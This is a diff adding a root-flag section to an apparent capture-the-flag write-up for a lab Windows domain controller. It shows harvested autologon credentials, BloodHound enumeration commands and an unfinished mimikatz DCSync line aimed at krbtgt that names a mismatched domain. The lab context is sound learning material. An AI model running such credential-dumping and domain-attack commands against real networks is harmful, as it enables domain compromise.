@@ -135,6 +135,41 @@ Used `evil-winrm` since port 5985 is open to recover the user flag:
 evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
 ```
 
+# Root Flag
+
+## Windows Enumeration
+
+Executed `winPEASx64.exe` and reviewing the output, I found autologon credentials for the user `svc_loanmanager`
+
+```bash
+Looking for AutoLogon credentials
+Some AutoLogon credentials were found
+DefaultDomainName             :  EGOTISTICALBANK
+DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+DefaultPassword               :  Moneymakestheworldgoround!
+```
+
+New set of credentials: `svc_loanmanager:Moneymakestheworldgoround!`
+
+
+## Bloodhound Enumeration
+
+Ran `bloodhound-python` to enumerate AD environment:
+
+```bash
+bloodhound-python -ns 10.10.10.175 -d EGOTISTICAL-BANK.local -dc EGOTISTICAL-BANK.local -u fsmith -p Thestrokes23 -c All
+```
+
+Uploaded JSON files to bloodhound and searched for our AD account `fsmith@EGOTISTICAL-BANK.LOCAL` and `svc_loanmanager@EGOTISTICAL-BANK.LOCAL` in Bloodhound in the search bar. Next, I right clicked the user nodes and marked them as owned. In the Queries tab, I selected the pre-built query "Shortest Path from Owned Principals".
+
+**N.B.** Bloodhound appears to default to the edge case CanPSRemote for both owned principles, deleted edge case to view other potential paths.
+
+
+
+lsadump::dcsync /user:dcorp\krbtgt
+
+
+
 
 
 
